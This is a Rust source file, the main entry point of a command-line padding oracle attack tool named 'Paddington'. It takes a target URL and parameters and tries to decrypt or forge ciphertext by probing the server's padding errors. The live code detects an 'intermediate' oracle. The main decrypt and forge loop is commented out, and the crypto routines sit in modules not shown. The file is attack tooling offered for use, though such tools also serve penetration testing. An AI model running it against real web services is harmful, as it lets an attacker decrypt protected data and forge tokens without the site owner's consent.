
use std::time::Duration;

use clap::{Parser, ValueEnum};
use strum_macros::Display;
use tokio::{sync::mpsc, time::sleep};

use crate::{
    crypt::{decrypt::{build_cradle, padding_oracle_decrypt}, detector::{Detector, IntermediateDetector, check_byte_creates_invalid_pt, decrypt_intermediate_block}, forge::padding_oracle_forge}, helper::{Config, Encoding, Messages, decode_ct, encode_ct}, oracle::{HTTPDoubleOracle, HTTPOracle, Oracle}, print::{fmt_bytes_custom, progress_bar}
};
use reqwest::{ Method};

pub mod crypt;
pub mod errors;
pub mod helper;
pub mod print;
pub mod oracle;

#[derive(Display, Debug, Clone, ValueEnum)]
enum Block {
    SMALL,
    MED,
    LARGE,
    AUTO
}

#[derive(Display, Debug, Clone, ValueEnum, PartialEq)]
enum Attack {
    DOUBLE,
    SINGLE,
    INTER,
    ALL,
}

#[derive(Parser, Debug, Clone)]
#[command(name = "Paddington", version, about = "Padding Oracles Ain't Dead!")]
struct Args {
    ///url for the vulnerable endpoint
    #[arg(short, long)]
    url: String,

    ///params to scan, can be url parameters, body parameters, or headers, alternatively surround the value you want to analyze with "@{ }@"
    #[arg(short, long)]
    params: Vec<String>,

    ///add headers to the request
    #[arg(short = 'H', long)]
    headers: Vec<String>,

    ///add the request body
    #[arg(short, long)]
    data: Option<String>,

    ///the request method to use [default: GET]
    #[arg(short, long, ignore_case = true)]
    method: Option<Method>,

    #[arg(
        short,
        long,
        help = "the encoding to use for the bytes, you can specify multiple encodings and they will be used in order.\nexample: if a string is base64 encoded then URL encoded, use \"-e url\" to url decode, and then \n\"-e b64\" to base64 decode [default: b64]"
    )]
    encoding: Vec<Encoding>,

    ///the number of threads to use
    #[arg(short, long, default_value_t = 10)]
    threads: usize,

    ///the plaintext to forge
    #[arg(short, long)]
    forge: Option<String>,

    ///the block size to use (small = 8) (med = 16) (large = 32)
    #[arg(short, long, ignore_case = true, default_value_t = Block::AUTO)]
    block_size: Block,

    ///the search string to match a response with valid padding
    #[arg(short, long)]
    search_pat: Option<String>,

    ///the proxy to use
    #[arg(long)]
    proxy: Option<String>,

    ///override the ciphertext to use
    #[arg(short, long)]
    ciphertext: Option<String>,

    ///add a prefix to the ciphertext (IV) encoded the same way as the ciphertext
    #[arg(short, long)]
    iv: Option<String>,

    #[arg(short, long, ignore_case = true, default_value_t = Attack::ALL, help = "the attack type to use, (single = standard attack) (double = double ciphertext attack) \n(inter = intermediate ciphertext attack, not implemented yet)")]
    attack: Attack,

    ///number of times to retry when no valid byte found
    #[arg(short, long, default_value_t = 5)]
    retry: usize,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let mut encoding = args.encoding.clone();
    if args.encoding.len() <= 0 {
        encoding = vec![Encoding::B64];
    }

    let mut config = Config::new();
    let block_sizes: &[u8] = match args.block_size {
        Block::SMALL => &[8],
        Block::MED => &[16],
        Block::LARGE => &[32],
        Block::AUTO => &[8,16,32]
    };
    for block_size in block_sizes {
        let args = args.clone();
        config.set("blk_size".to_string(), (*block_size).to_string());
        config.set("threads".to_string(), args.threads.to_string());
        config.set("retry".to_string(), args.retry.to_string());

        let mut headers: Vec<(String, String)> = vec![];
        for header in &args.headers {
            let header_parts = header.split(':').map(String::from).collect::<Vec<String>>();
            if header_parts.len() >= 2 {
                // get the val and remove leading whitespace
                let header_val = header_parts[1..].join("").trim_ascii_start().to_string();
                headers.push((header_parts[0].clone(), header_val));
            }
        }

        let standard_oracle = Box::new(HTTPOracle::new(
            (&args.url).to_owned().clone(),
            headers.clone(),
            args.method.clone().unwrap_or(Method::GET),
            args.data.clone(),
            encoding.clone(),
            args.params.clone(),
            args.search_pat.clone(),
            args.proxy.clone(),
        ));
        let standard_ct = standard_oracle.base_ct.clone();

        let detect = IntermediateDetector::init(&standard_ct, standard_oracle, *block_size as usize, args.threads).await;
        if detect.is_ok(){
            println!("Intermediate Oracle Detected");
            let detector = detect.unwrap();
            let block_for_decryption = detector.block_suffix[..*block_size as usize].to_vec();
            let cradle = build_cradle(&detector, &block_for_decryption,&detector.block_prefix, &detector.block_suffix, 1000).await.unwrap();
            println!("found cradle! {:?}", cradle);
            println!("{:?}", detector.check(&[detector.block_prefix.clone(), cradle.0, block_for_decryption,  cradle.1, detector.block_suffix.clone()].concat()).await)
            //let cradle_verification = detector.check(&[detector.block_prefix.as_slice(), cradle.0.as_slice(), cradle.1.as_slice(), detector.block_suffix.as_slice()].concat()).await;
            //println!("cradle {:?}", cradle_verification);
            
            //let res = check_byte_creates_invalid_pt(&detector, 0x0a, 2,&cradle.1, &detector.block_suffix[..*block_size as usize], &[detector.block_prefix.as_slice(), cradle.0.as_slice()].concat(), &detector.block_suffix[*block_size as usize..], 20).await;
            //let res = check_byte_creates_invalid_pt(&detector, cradle.0[0], 0,&cradle.0, &cradle.1, &detector.block_prefix, &detector.block_suffix, 20).await;
            //println!("{:?}", res);
        }else{
            println!("No Intermediate Oracle Detected");
        }
        // let double_oracle = Box::new(HTTPDoubleOracle::new(
        //     args.url,
        //     headers,
        //     args.method.unwrap_or(Method::GET),
        //     args.data,
        //     encoding.clone(),
        //     args.params,
        //     args.search_pat,
        //     args.proxy,
        // ));
        // let double_ct = double_oracle.base_ct.clone();

        // let mut oracles: Vec<(Box<dyn Oracle>, Vec<u8>, String)> = vec![];

        // if args.attack == Attack::ALL || args.attack == Attack::SINGLE {
        //     oracles.push((
        //         standard_oracle,
        //         standard_ct,
        //         String::from("\nTesting standard padding oracle, block size: ".to_owned()+&block_size.to_string()),
        //     ));
        // }
        // if args.attack == Attack::ALL || args.attack == Attack::DOUBLE {
        //     oracles.push((
        //         double_oracle,
        //         double_ct,
        //         String::from("\nTesting double padding oracle, block size: ".to_owned()+&block_size.to_string()),
        //     ));
        // }

        // // find ct_len for the progress bar
        // let mut ct_len = oracles[0].1.len() - *block_size as usize;
        // if let Some(ref pt) = args.forge {
        //     ct_len = ((pt.len() / *block_size as usize) + 1) * *block_size as usize;
        // } else {
        //     if let Some(ref ct_override) = args.ciphertext {
        //         ct_len = decode_ct(ct_override.to_string(), encoding.clone()).len() - *block_size as usize;
        //     }
        //     if let Some(ref iv) = args.iv {
        //         ct_len += decode_ct(iv.to_string(), encoding.clone()).len()
        //     }
        // }

        // // this section runs the padding oracle attack
        // for (oracle, base_ct, log) in oracles {
        //     // this section here is just to print the progress bar
        //     let (tx, rx) = mpsc::channel::<Messages>(255);
        //     progress_bar(ct_len, rx);
        //     println!("\n{}", log);
        //     let mut ct = base_ct.clone();
        //     if let Some(override_ct) = args.ciphertext.clone() {
        //         ct = decode_ct(override_ct, encoding.clone());
        //     }
        //     if let Some(iv) = args.iv.clone() {
        //         let iv = decode_ct(iv, encoding.clone());
        //         ct = iv.iter().chain(ct.iter()).cloned().collect();
        //     }
        //     if let Some(forge_string) = args.forge.clone() {
        //         let result = padding_oracle_forge(
        //             forge_string.as_bytes(),
        //             &ct.clone(),
        //             oracle,
        //             tx.clone(),
        //             config.clone(),
        //         )
        //         .await;
        //         if let Ok(ct) = result {
        //             println!(
        //                 "\nforged ciphertext: {}",
        //                 encode_ct(&ct, encoding)
        //                     .expect("Error: forged ciphertext cannot be displayed as utf-8")
        //             );
        //             return;
        //         }
        //     } else {
        //         let res = padding_oracle_decrypt(&ct.clone(), oracle, tx.clone(), config.clone()).await;
        //         if let Ok(res) = res {
        //             println!("\nplaintext: {}", fmt_bytes_custom(&res));
        //             return;
        //         }
        //     }
        // }
    }
}
